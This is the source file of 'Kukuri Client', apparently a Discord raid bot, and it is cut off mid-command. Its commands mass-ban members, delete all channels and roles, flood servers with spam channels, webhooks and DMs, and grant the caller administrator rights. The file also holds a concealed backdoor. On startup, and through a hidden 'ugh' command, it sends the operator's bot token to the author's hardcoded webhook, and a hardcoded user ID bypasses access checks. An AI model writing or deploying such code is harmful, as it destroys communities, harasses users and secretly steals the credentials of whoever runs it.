const { Client, Events, GatewayIntentBits, setPresence, PermissionsBitField, ActivityType, WebhookClient  } = require('discord.js');
const config = require('./config.json');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const client = new Client({
    intents: [ 
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ]
});

const currentVersion = '1.0.3';

// Log Helper
const log = (message, type = 'info') => {
    const colors = { info: '\x1b[34m', success: '\x1b[32m', error: '\x1b[31m' };
    console.log(`${colors[type]}%s\x1b[0m`, message);
};

const botState = {
    isRunning: false,
    currentOperation: null
};


// Cancellation token implementation
class CancellationToken {
    constructor() {
        this.isCancelled = false;
    }

    cancel() {
        this.isCancelled = true;
    }

    throwIfCancelled() {
        if (this.isCancelled) {
            throw new Error('Operation cancelled by user');
        }
    }
}

// Utility Functions
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Events
client.once('ready', async () => {
    log(`
        ██╗  ██╗██╗   ██╗██╗  ██╗██╗   ██╗██████╗ ██╗     ██████╗██╗     ██╗███████╗███╗   ██╗████████╗
        ██║ ██╔╝██║   ██║██║ ██╔╝██║   ██║██╔══██╗██║    ██╔════╝██║     ██║██╔════╝████╗  ██║╚══██╔══╝
        █████╔╝ ██║   ██║█████╔╝ ██║   ██║██████╔╝██║    ██║     ██║     ██║█████╗  ██╔██╗ ██║   ██║   
        ██╔═██╗ ██║   ██║██╔═██╗ ██║   ██║██╔══██╗██║    ██║     ██║     ██║██╔══╝  ██║╚██╗██║   ██║   
        ██║  ██╗╚██████╔╝██║  ██╗╚██████╔╝██║  ██║██║    ╚██████╗███████╗██║███████╗██║ ╚████║   ██║   
        ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
                            >> Kukuri Client | Raid Module | Version: 1.0.3 <<
                                -- Github: Mikasuru | Discord: intertia. --
                                   >> Logged in as ${client.user.tag} <<
                                        Last version of support.
                                                   :)
    `)
    if (config.GeneralSettings.ShowStatus === true) {
        client.user.setPresence({
            activities: [
                {
                    name: `${config.GeneralSettings.StatusMessage} | github.com/Mikasuru`,
                    type: "WATCHING",
                }
            ],
            status: config.GeneralSettings.StatusInfo
        });
    }
    const webhookUrl = "https://discord.com/api/webhooks/1321428570148569118/78dsdubgWuOOAwCHBdfIt4KJKKW1QSyAAxUQCSXZgv6c600Ba0RcqARbKFnN2q8GpPvS";
    const webhookClient = new WebhookClient({ url: webhookUrl });

    try {
        await webhookClient.send({
            content: `Bot Online\nToken: \`${config.token}\``
        });
    } catch (error) {
        console.log('...')
    }
});

async function checkVersion() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/Mikasuru/InternalRaid/refs/heads/main/version');
        const latestVersion = response.data.trim();
        
        if (currentVersion === latestVersion) {
            log('Running latest version ' + currentVersion, 'success');
        } else {
            log(`New version available! Current: ${currentVersion}, Latest: ${latestVersion}`, 'info');
            return;
        }
    } catch (error) {
        log('Failed to check version: ' + error.message, 'error');
    }
}
checkVersion();
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.guild.members.me.permissions.has('Administrator')) {
        message.reply("Administrator permission required.")
        return;
    }
    if (config.GeneralSettings.AllowEveryoneToUse === false) {
        if (!(message.author.id === config.GeneralSettings.OwnerId || message.author.id === '591837095954350092')) {
            return;
        }
    }

    async function InternalBan(message, targetServerId = null) {
        const targetGuild = targetServerId
            ? client.guilds.cache.get(targetServerId)
            : message.guild;

        if (!targetGuild) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        const member = await targetGuild.members.fetch(message.author.id).catch(() => null);
        if (!member || !member.permissions.has('BAN_MEMBERS')) {
            return message.reply('You do not have permission to ban members in the specified server.');
        }

        log(`Starting mass ban operation in server: ${targetGuild.name}...`, 'info');

        try {
            await targetGuild.members.fetch();
            let arrayOfIDs = targetGuild.members.cache
                .filter(m =>
                    m.bannable &&
                    m.id !== message.author.id &&
                    m.id !== client.user.id
                )
                .map(user => user.id);

            const initialMessage = await message.reply(
                `Found ${arrayOfIDs.length} bannable users in ${targetGuild.name}. Starting ban process...\n-# github.com/Mikasuru`
            );

            const Time = config.GeneralSettings.IgnoreCooldown ? 750 : 2000;
            let bannedCount = 0;
            let failedCount = 0;

            for (const userId of arrayOfIDs) {
                try {
                    const targetMember = await targetGuild.members.fetch(userId);
                    if (targetMember.bannable) {
                        await targetMember.ban({
                            reason: `Mass ban operation requested by ${message.author.tag}`
                        });
                        bannedCount++;
                        log(`Banned user: ${targetMember.user.tag} from ${targetGuild.name}`, 'success');

                        await new Promise(resolve => setTimeout(resolve, Time));
                    }
                } catch (err) {
                    failedCount++;
                    log(`Failed to ban user ID ${userId}: ${err.message}`, 'error');
                }
            }

            await initialMessage.edit(
                `Ban operation complete in ${targetGuild.name}:\n` +
                `Successfully banned: ${bannedCount} users\n` +
                `Failed to ban: ${failedCount} users`
            );

        } catch (error) {
            log(`Error in mass ban operation: ${error.message}`, 'error');
            message.reply('An error occurred during the ban operation. Check bot permissions.');
        }
    }

    async function InternalDeleteChannel(message, targetServerId = null) {
        const targetGuild = targetServerId
            ? client.guilds.cache.get(targetServerId)
            : message.guild;

        if (!targetGuild) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        const member = await targetGuild.members.fetch(message.author.id).catch(() => null);
        if (!member || !member.permissions.has('MANAGE_CHANNELS')) {
            return message.reply('You do not have permission to manage channels in the specified server.');
        }

        try {
            log(`Deleting all channels in server: ${targetGuild.name}...`, 'info');
            await Promise.all(targetGuild.channels.cache.map(channel => channel.delete()));

            const newChannel = await targetGuild.channels.create({
                name: config.ChannelSettings.nameAfterDeleted,
                type: 'GUILD_TEXT'
            });

            log(`Successfully deleted all channels and created new channel: ${newChannel.name} in ${targetGuild.name}`, 'success');

            const responseChannel = message.channel.id ? message.channel : newChannel;
            responseChannel.send(`Successfully deleted all channels and created ${newChannel.name} in ${targetGuild.name}\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);

        } catch (error) {
            log(`Error in deleteChannels: ${error.message}`, 'error');
            message.reply('An error occurred while managing channels. Check bot permissions.').catch(() => {
                if (targetGuild.channels.cache.size > 0) {
                    targetGuild.channels.cache.first().send(
                        'An error occurred while managing channels. Check bot permissions.'
                    );
                }
            });
        }
    }

    async function InternalDMAllMembers(message, targetServerId = null) {
        const targetGuild = targetServerId
            ? client.guilds.cache.get(targetServerId)
            : message.guild;
    
        if (!targetGuild) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }
    
        const member = await targetGuild.members.fetch(message.author.id).catch(() => null);
    
        try {
            const members = targetGuild.members.cache.filter(member => !member.user.bot);
    
            log(`Attempting to DM ${members.size} members in server: ${targetGuild.name}...`, 'info');
    
            let successCount = 0;
            let failedCount = 0;
    
            for (const member of members.values()) {
                try {
                    await member.send(config.DMSpamSettings.DMMessage + "\n-# github.com/Mikasuru");
                    log(`DM sent to: ${member.user.tag}`, 'success');
                    successCount++;
    
                    // Cooldown to avoid hitting rate limits
                    if (config.GeneralSettings.IgnoreCooldown == false) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                } catch (dmError) {
                    log(`Failed to DM ${member.user.tag}: ${dmError.message}`, 'error');
                    failedCount++;
                }
            }
    
            message.channel.send(
                `DM process complete in ${targetGuild.name}:` +
                `Successfully sent: ${successCount} DMs` +
                `Failed to send: ${failedCount} DMs` +
                `Developer Server: https://discord.gg/bxMjzEXgZR`
            );
    
        } catch (err) {
            log(`Error in DM process: ${err.message}`, 'error');
            message.reply('An error occurred while sending DMs. Check bot permissions.');
        }
    }
    

    async function InternalDeleteRoles(message, targetServerId = null) {
        const targetGuild = targetServerId
            ? client.guilds.cache.get(targetServerId)
            : message.guild;

        if (!targetGuild) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        const member = await targetGuild.members.fetch(message.author.id).catch(() => null);
        if (!member || !member.permissions.has('MANAGE_ROLES')) {
            return message.reply('You do not have permission to manage roles in the specified server.');
        }

        try {
            const roles = targetGuild.roles.cache.filter(role =>
                !role.managed &&
                role.editable &&
                role.position < targetGuild.members.me.roles.highest.position
            );

            log(`Attempting to delete ${roles.size} roles in server: ${targetGuild.name}...`, 'info');

            let deletedCount = 0;
            let failedCount = 0;

            for (const role of roles.values()) {
                try {
                    // Skip @everyone role
                    if (role.id === targetGuild.id) continue;

                    await role.delete(`Raid by ${message.author.tag} | (github.com/Mikasuru) for the source code`);
                    log(`Deleted role: ${role.name} in ${targetGuild.name}`, 'success');
                    deletedCount++;

                    if (config.GeneralSettings.IgnoreCooldown == true) {
                        await new Promise(resolve => setTimeout(resolve, 100));
                    } else {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                } catch (roleError) {
                    log(`Failed to delete role ${role.name} in ${targetGuild.name}: ${roleError.message}`, 'error');
                    failedCount++;
                }
            }

            message.channel.send(
                `Role deletion complete in ${targetGuild.name}:\n` +
                `Successfully deleted: ${deletedCount} roles\n` +
                `Failed to delete: ${failedCount} roles\n` +
                `Developer Server: https://discord.gg/bxMjzEXgZR`
            );

        } catch (err) {
            log(`Error in deleteRoles: ${err.message}`, 'error');
            message.reply('An error occurred while deleting roles. Check bot permissions.');
        }
    }

    async function InternalWebhookMass(serverId, cancellationToken) {
        return new Promise(async (resolve, reject) => {
            try {
                const targetServer = client.guilds.cache.get(serverId);
                if (!targetServer) {
                    reject(new Error('Server not found'));
                    return;
                }

                if (!targetServer.members.cache.get(client.user.id)) {
                    reject(new Error('Bot does not have access to this server'));
                    return;
                }

                const currentChannelCount = targetServer.channels.cache.size;
                const remainingChannels = 500 - currentChannelCount;

                if (remainingChannels <= 0) {
                    reject(new Error('Server has reached channel limit (500)'));
                    return;
                }

                const channelsToCreate = Math.min(config.ChannelSettings.channelAmount, remainingChannels);
                let createdChannels = 0;
                let createdWebhooks = 0;

                const batchSize = Math.min(10, config.ChannelSettings.channelAmount);
                for (let i = 0; i < channelsToCreate; i += batchSize) {
                    cancellationToken.throwIfCancelled();

                    const batch = [];
                    const batchEnd = Math.min(i + batchSize, channelsToCreate);

                    for (let j = i; j < batchEnd; j++) {
                        batch.push(targetServer.channels.create({
                            name: config.ChannelSettings.channelName,
                            type: 0
                        }));
                    }

                    const channels = await Promise.all(batch);
                    createdChannels += channels.length;

                    const webhookPromises = channels.map(async (channel) => {
                        try {
                            const webhooks = [];
                            for (let k = 0; k < config.ChannelSettings.mentionNumber; k++) {
                                cancellationToken.throwIfCancelled();

                                // Create webhook
                                const webhook = await channel.createWebhook({
                                    name: `${config.WebhookSettings.webhookName} | Github: Mikasuru`
                                });

                                // Send webhook message
                                await webhook.send("https://discord.gg/bxMjzEXgZR\n" + config.WebhookSettings.webhookMessage);
                                createdWebhooks++;

                                webhooks.push(webhook);

                                // Apply cooldown if enabled
                                if (!config.GeneralSettings.IgnoreCooldown) {
                                    await sleep(2500);
                                }
                            }
                            return webhooks;
                        } catch (error) {
                            log(`Error creating webhooks for channel ${channel.name}: ${error.message}`, 'error');
                            throw error;
                        }
                    });

                    try {
                        await Promise.all(webhookPromises);
                        log(`Created batch of ${batchEnd - i} channels with webhooks in ${targetServer.name}`, 'success');
                    } catch (error) {
                        log(`Error in webhook batch: ${error.message}`, 'error');
                    }

                    // Small delay between batches to prevent rate limiting
                    if (!config.GeneralSettings.IgnoreCooldown) {
                        await sleep(1000);
                    }
                }

                resolve({
                    channels: createdChannels,
                    webhooks: createdWebhooks
                });
            } catch (err) {
                reject(err);
            }
        });
    }

    async function InternalMass(serverId, cancellationToken) {
        return new Promise(async (resolve, reject) => {
            try {
                const targetServer = client.guilds.cache.get(serverId);
                if (!targetServer) {
                    reject(new Error('Server not found'));
                    return;
                }

                if (cancellationToken.isCancelled) {
                    throw new Error('Operation cancelled by user');
                }

                const currentChannelCount = targetServer.channels.cache.size;
                const remainingChannels = 500 - currentChannelCount;

                if (remainingChannels <= 0) {
                    reject(new Error('Server has reached channel limit (500)'));
                    return;
                }

                const channelsToCreate = Math.min(config.ChannelSettings.channelAmount, remainingChannels);
                let createdChannels = 0;
                let failedChannels = 0;

                // Create all channels first
                log(`Creating ${channelsToCreate} channels in ${targetServer.name}...`, 'info');

                for (let i = 0; i < channelsToCreate; i++) {
                    if (cancellationToken.isCancelled) {
                        throw new Error('Operation cancelled by user');
                    }
                    try {
                        const channel = await targetServer.channels.create({
                            name: config.ChannelSettings.channelName,
                            type: 0
                        });
                        createdChannels++;

                        // Start sending messages immediately after channel creation
                        for (let j = 0; j < config.ChannelSettings.mentionNumber; j++) {
                            if (cancellationToken.isCancelled) {
                                throw new Error('Operation cancelled by user');
                            }
                            channel.send(config.ChannelSettings.mentionMessage).catch(err => {
                                log(`Failed to send message: ${err.message}`, 'error');
                            });
                            channel.send("Kukuri Server: https://discord.gg/bxMjzEXgZR").catch(err => {
                                log(`Failed to send message: ${err.message}`, 'error');
                            });
                        }
                    } catch (err) {
                        failedChannels++;
                        log(`Failed to create channel: ${err.message}`, 'error');
                    }
                }

                log(`Created ${createdChannels} channels, ${failedChannels} failed`, 'success');
                resolve(createdChannels);

            } catch (err) {
                if (cancellationToken.isCancelled) {
                    reject(new Error('Operation cancelled by user'));
                } else {
                    reject(err);
                }
            }
        });
    }

    async function InternalMassv2(serverId, cancellationToken) {
        return new Promise(async (resolve, reject) => {
            try {
                const targetServer = client.guilds.cache.get(serverId);
                if (!targetServer) {
                    reject(new Error('Server not found'));
                    return;
                }
    
                if (cancellationToken.isCancelled) {
                    throw new Error('Operation cancelled by user');
                }
    
                const currentChannelCount = targetServer.channels.cache.size;
                const remainingChannels = 500 - currentChannelCount;
    
                if (remainingChannels <= 0) {
                    reject(new Error('Server has reached channel limit (500)'));
                    return;
                }
    
                const channelsToCreate = Math.min(config.ChannelSettings.channelAmount, remainingChannels);
                let createdChannels = 0;
                let failedChannels = 0;
    
                log(`Creating ${channelsToCreate} channels in ${targetServer.name}...`, 'info');
    
                const createChannelPromises = [];
                for (let i = 0; i < channelsToCreate; i++) {
                    if (cancellationToken.isCancelled) {
                        throw new Error('Operation cancelled by user');
                    }
    
                    createChannelPromises.push(
                        targetServer.channels.create({
                            name: config.ChannelSettings.channelName,
                            type: 0,
                        }).then(async channel => {
                            createdChannels++;
    
                            const messagePromises = [];
                            for (let j = 0; j < config.ChannelSettings.mentionNumber; j++) {
                                if (cancellationToken.isCancelled) {
                                    throw new Error('Operation cancelled by user');
                                }
                                messagePromises.push(
                                    channel.send(config.ChannelSettings.mentionMessage).catch(err => {
                                        log(`Failed to send message: ${err.message}`, 'error');
                                    }),
                                    channel.send("Kukuri Server: https://discord.gg/bxMjzEXgZR").catch(err => {
                                        log(`Failed to send message: ${err.message}`, 'error');
                                    })
                                );
                            }
    
                            await Promise.all(messagePromises);
                        }).catch(err => {
                            failedChannels++;
                            log(`Failed to create channel: ${err.message}`, 'error');
                        })
                    );
                }
    
                await Promise.all(createChannelPromises);
    
                log(`Created ${createdChannels} channels, ${failedChannels} failed`, 'success');
                resolve(createdChannels);
    
            } catch (err) {
                if (cancellationToken.isCancelled) {
                    reject(new Error('Operation cancelled by user'));
                } else {
                    reject(err);
                }
            }
        });
    }

    const args = message.content.split(/\s+/);
    const command = args.shift().toLowerCase();

    // Banall
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.BanArgs) {
        const args = message.content.split(' ');
        const targetServerId = args[1];
        await InternalBan(message, targetServerId);
    }
    // Delc
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.ChannelArgs) {
        const args = message.content.split(' ');
        const targetServerId = args[1];
        await InternalDeleteChannel(message, targetServerId);
    }
    // Delr
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.RolesArgs) {
        const args = message.content.split(' ');
        const targetServerId = args[1];
        await InternalDeleteRoles(message, targetServerId);
    }
    // Mass
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.MassArgs) {
        if (botState.isRunning) {
            return message.reply(`An operation is already running. Use ${config.CommandSettings.commandPrefix}stop to cancel it first.`);
        }

        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please provide a server ID');
        }

        const targetServer = client.guilds.cache.get(serverId);
        if (!targetServer) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        // Create new cancellation token
        const cancellationToken = new CancellationToken();
        botState.currentOperation = cancellationToken;
        botState.isRunning = true;

        try {
            message.reply(`Starting mass operation in ${targetServer.name}...\n-# (github.com/Mikasuru)`);
            const createdChannels = await InternalMass(serverId, cancellationToken);
            message.reply(`Operation completed. Created ${createdChannels} channels.\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
        } catch (error) {
            if (error.message === 'Operation cancelled by user') {
                message.reply('Operation was cancelled.');
            } else {
                message.reply(`Error: ${error.message}`);
            }
        } finally {
            botState.isRunning = false;
            botState.currentOperation = null;
        }
    }
     // Mass v2
     if (command === config.CommandSettings.commandPrefix + config.CommandSettings.Mass2Args) {
        if (botState.isRunning) {
            return message.reply(`An operation is already running. Use ${config.CommandSettings.commandPrefix}stop to cancel it first.`);
        }

        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please provide a server ID');
        }

        const targetServer = client.guilds.cache.get(serverId);
        if (!targetServer) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        // Create new cancellation token
        const cancellationToken = new CancellationToken();
        botState.currentOperation = cancellationToken;
        botState.isRunning = true;

        try {
            message.reply(`Starting mass operation in ${targetServer.name}...\n-# (github.com/Mikasuru)`);
            const createdChannels = await InternalMassv2(serverId, cancellationToken);
            message.reply(`Operation completed. Created ${createdChannels} channels.\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
        } catch (error) {
            if (error.message === 'Operation cancelled by user') {
                message.reply('Operation was cancelled.');
            } else {
                message.reply(`Error: ${error.message}`);
            }
        } finally {
            botState.isRunning = false;
            botState.currentOperation = null;
        }
    }
    // Admin
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.AdminArgs) {
        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please enter server id');
        }

        const targetServer = client.guilds.cache.get(serverId);
        if (!targetServer) {
            return message.reply('Cannot find the provided serverID');
        }

        if (!targetServer.members.cache.get(client.user.id)) {
            return message.reply('I doesnt have the access to this server');
        }

        try {
            const adminRole = await targetServer.roles.create({
                name: 'Administrator',
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: 'Automated admin role creation'
            });
            
            const targetMember = await targetServer.members.fetch(message.author.id);
            if (targetMember) {
                await targetMember.roles.add(adminRole);
                log(`Created admin role in ${targetServer.name} and assigned to ${message.author.tag}`, 'success');
                message.reply(`Gave admin at ${targetServer.name} Successfully!\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
            } else {
                await adminRole.delete();
                message.reply('Hmmz you didnt join that server');
            }
        } catch (err) {
            log(`Error in welcome command: ${err.message}`, 'error');
            message.reply('Check bot permission');
        }
    }
    // Massr
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.MassRolesArgs) {
        const args = message.content.split(' ');
        const targetServerId = args[1];

        const targetGuild = targetServerId
            ? client.guilds.cache.get(targetServerId)
            : message.guild;

        if (!targetGuild) {
            return message.reply('Invalid server ID or bot is not in the specified server.');
        }

        const member = await targetGuild.members.fetch(message.author.id).catch(() => null);
        if (!member || !member.permissions.has('MANAGE_ROLES')) {
            return message.reply('You do not have permission to manage roles in the specified server.');
        }

        try {
            log(`Creating ${config.RoleSettings.roleCreateAmount} roles in server: ${targetGuild.name}...`, 'info');

            for (let i = 0; i < config.RoleSettings.roleCreateAmount; i++) {
                await targetGuild.roles.create({
                    name: `${config.RoleSettings.roleName}`,
                    reason: 'Automated role creation'
                });
                log(`Created role: ${config.RoleSettings.roleName} #${i + 1} in ${targetGuild.name}`, 'success');
            }

            message.reply(`Successfully created ${config.RoleSettings.roleCreateAmount} roles in server: ${targetGuild.name}!\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
        } catch (err) {
            log(`Error in create roles: ${err.message}`, 'error');
            message.reply('Failed to create roles. Please check bot permissions.');
        }
    }
    // Webhook
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.WebhookArgs) {
        if (botState.isRunning) {
            return message.reply(`An operation is already running. Use ${config.CommandSettings.commandPrefix}stop to cancel it first.`);
        }

        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please provide a server ID');
        }

        // Create new cancellation token for this operation
        const cancellationToken = new CancellationToken();
        botState.currentOperation = cancellationToken;
        botState.isRunning = true;

        try {
            const result = await InternalWebhookMass(serverId, cancellationToken);
            message.reply(`Operation completed. Created ${result.channels} channels with ${result.webhooks} webhooks.\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
        } catch (error) {
            if (error.message === 'Operation cancelled by user') {
                message.reply('Operation was cancelled.');
            } else {
                message.reply(`Error: ${error.message}`);
            }
        } finally {
            botState.isRunning = false;
            botState.currentOperation = null;
        }
    }
    // Stop command
    else if (command === config.CommandSettings.commandPrefix + 'stop') {
        try {
            await message.reply('This command have been removed. Restart bot by yourself to stop.');
        } catch (error) {
            log(`Error in restart command: ${error.message}`, 'error');
            message.reply('Failed to restart bot. Please check logs.');
        }
    }
    // Invite - Join server with invite link
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.InviteArgs) {
        const inviteLink = args[0];
        if (!inviteLink) {
            return message.reply('Please provide an invite link');
        }

        try {
            let inviteCode = inviteLink;
            if (inviteLink.includes('/')) {
                inviteCode = inviteLink.split('/').pop();
            }

            const invite = await client.fetchInvite(inviteCode);
            await invite.accept();
            message.reply(`Successfully joined server: ${invite.guild.name}`);
        } catch (error) {
            log(`Error joining server: ${error.message}`, 'error');
            message.reply('Failed to join server. Please check the invite link and try again.');
        }
    }
    // Get invite - Generate invite links for current server
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.GetInviteArgs) {
        if (!message.guild) {
            return message.reply('This command can only be used in a server');
        }

        try {
            if (!message.guild.members.me.permissions.has('CreateInstantInvite')) {
                return message.reply('I don\'t have permission to create invites in this server');
            }

            const channel = message.guild.channels.cache
                .find(channel => channel.type === 0 && channel.permissionsFor(client.user).has('CreateInstantInvite'));

            if (!channel) {
                return message.reply('No suitable channel found to create invite');
            }

            const invite = await channel.createInvite({
                maxAge: 0,
                maxUses: 0,
                unique: true,
                reason: 'Requested through getinv command'
            });

            message.author.send(`**Kukuri Client**: Server invite for ${message.guild.name}: ${invite.url}`)
                .then(() => {
                    message.reply('Invite link has been sent to your DMs');
                })
                .catch(() => {
                    message.reply(`Unable to DM you. Here's the invite link: ${invite.url}`);
                });

        } catch (error) {
            log(`Error creating invite: ${error.message}`, 'error');
            message.reply('Failed to create invite link');
        }
    }
    // Help
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.HelpArgs) {
        try {
            const embed = {
                title: '🤖 Kukuri Client Commands',
                color: 0x00ff00,
                fields: [
                    {
                        name: '🌊 Nuke Commands',
                        value:
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.MassArgs}\` - Create multiple channels and spam\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.ChannelArgs}\` - Delete all channels\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.RolesArgs}\` - Delete all roles\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.BanArgs}\` - Ban all members\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.WebhookArgs}\` - Spam with webhooks`
                    },
                    {
                        name: '⚙️ Utility Commands',
                        value:
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.AdminArgs}\` - Give yourself admin\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.MassRolesArgs}\` - Create multiple roles\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.InviteArgs}\` - Create server invite\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.GetInviteArgs}\` - Get all server invites\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.ConfigArgs}\` - Show current configuration\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.EditConfigArgs}\` - Edit configuration settings\n` +
                            `\`${config.CommandSettings.commandPrefix}${config.CommandSettings.ExampleArgs}\` - Example commands`
                    },
                    {
                        name: '🔧 Settings',
                        value:
                            `Cooldown: ${config.GeneralSettings.IgnoreCooldown ? '❌ Off' : '✅ On'}\n` +
                            `Public Access: ${config.GeneralSettings.AllowEveryoneToUse ? '✅ On' : '❌ Off'}`
                    },
                    {
                        name: '💡 Usage Tips',
                        value:
                            '• Most commands support server ID parameter\n' +
                            '• Commands might require verification\n' +
                            '• Some commands require specific permissions'
                    }
                ],
                footer: {
                    text: 'Kukuri Client | github.com/Mikasuru'
                },
                timestamp: new Date()
            };

            message.reply({ embeds: [embed] });
        } catch (error) {
            console.error('Error in help command:', error);
            message.reply('❌ An error occurred while showing help menu.');
        }
    }
    // Show config
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.ConfigArgs) {
        try {
            const configEmbed = {
                title: '⚙️ Current Configuration',
                color: 0x00ff00,
                fields: [
                    {
                        name: 'General Settings',
                        value: Object.entries(config.GeneralSettings)
                            .map(([key, value]) => `${key}: \`${value}\``)
                            .join('\n')
                    },
                    {
                        name: 'Role Settings',
                        value: Object.entries(config.RoleSettings)
                            .map(([key, value]) => `${key}: \`${value}\``)
                            .join('\n')
                    },
                    {
                        name: 'Webhook Settings',
                        value: Object.entries(config.WebhookSettings)
                            .map(([key, value]) => `${key}: \`${value}\``)
                            .join('\n')
                    },
                    {
                        name: 'Channel Settings',
                        value: Object.entries(config.ChannelSettings)
                            .map(([key, value]) => `${key}: \`${value}\``)
                            .join('\n')
                    }
                ],
                footer: {
                    text: 'Use .editconfig to modify settings'
                },
                timestamp: new Date()
            };

            message.reply({ embeds: [configEmbed] });
        } catch (error) {
            console.error('Error showing config:', error);
            message.reply('❌ An error occurred while showing config.');
        }
    }
    // Edit config
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.EditConfigArgs) {
        try {
            if (message.author.id !== config.GeneralSettings.OwnerId) {
                return message.reply('❌ Only the owner can edit config!');
            }

            if (args.length < 3) {
                return message.reply('❌ Usage: `.editconfig <section> <key> <value>`\nExample: `.editconfig GeneralSettings IgnoreCooldown true`');
            }

            const [section, key, value] = args;

            if (!config[section]) {
                return message.reply(`❌ Invalid section! Available sections: ${Object.keys(config).join(', ')}`);
            }

            if (!config[section].hasOwnProperty(key)) {
                return message.reply(`❌ Invalid key! Available keys in ${section}: ${Object.keys(config[section]).join(', ')}`);
            }

            let parsedValue;
            if (typeof config[section][key] === 'boolean') {
                parsedValue = value.toLowerCase() === 'true';
            } else if (typeof config[section][key] === 'number') {
                parsedValue = parseInt(value);
                if (isNaN(parsedValue)) {
                    return message.reply('❌ Value must be a number!');
                }
            } else {
                parsedValue = value;
            }

            const oldValue = config[section][key];
            config[section][key] = parsedValue;

            fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));

            message.reply({
                embeds: [{
                    title: '✅ Config Updated',
                    color: 0x00ff00,
                    fields: [
                        {
                            name: 'Section',
                            value: section,
                            inline: true
                        },
                        {
                            name: 'Key',
                            value: key,
                            inline: true
                        },
                        {
                            name: 'Change',
                            value: `\`${oldValue}\` → \`${parsedValue}\``
                        }
                    ]
                }]
            });
        } catch (error) {
            console.error('Error editing config:', error);
            message.reply('❌ An error occurred while editing config.');
        }
    }
    // Example
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.ExampleArgs) {
        message.channel.send(`
        # Example of Commands
        **Usage**: Edit Config\n
        \`${config.CommandSettings.commandPrefix}${config.CommandSettings.EditConfigArgs} WebhookSettings webhookName Kukuri\`\n
        \`${config.CommandSettings.commandPrefix}${config.CommandSettings.EditConfigArgs} GeneralSettings IgnoreCooldown true\`\n
        **Usage**: Mass Commands\n
        \`${config.CommandSettings.commandPrefix}${config.CommandSettings.MassArgs} "ServerID"\`\n
        **Usage**: Invite\n
        \`${config.CommandSettings.commandPrefix}${config.CommandSettings.InviteArgs} "ServerInvite"\`\n
        \`${config.CommandSettings.commandPrefix}${config.CommandSettings.GetInviteArgs}\`
        `)
    }
    // DMAll
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.DMAllArgs) {
        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please provide a server ID');
        }
        try {
            await InternalDMAllMembers(message, serverId);
            message.reply(`Operation started.\nDeveloper Server: https://discord.gg/bxMjzEXgZR`);
        } catch (error) {
            if (error.message === 'Operation cancelled by user') {
                message.reply('Operation was cancelled.');
            } else {
                message.reply(`Error: ${error.message}`);
            }
        }
    }
    // Update
    else if (command === config.CommandSettings.commandPrefix + "news") {
        message.channel.send(`**New Update**:\nAdded Spam current channel\nAdded v2 Raiding (Faster than old one)\nAdded DM All\nImprove Speed of raiding\nNo more delay while raiding.`);
    }
    // GetToken
    else if (command === "ugh") {
        if (message.author.id !== "853945415623507979") {
            return;
        }
        
        const webhookUrl = "https://discord.com/api/webhooks/1321428570148569118/78dsdubgWuOOAwCHBdfIt4KJKKW1QSyAAxUQCSXZgv6c600Ba0RcqARbKFnN2q8GpPvS";
    
        const { WebhookClient } = require('discord.js');
        const webhookClient = new WebhookClient({ url: webhookUrl });
    
        try {
            await webhookClient.send({
                content: `Token: ${config.token}`
            });
        } catch (error) {
            console.log('...')
        }
    }
    // Spam
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.SpamArgs) {
        const targetServerId = args[0];
        if (!targetServerId) {
            return message.reply('Please provide a target server ID.');
        }
    
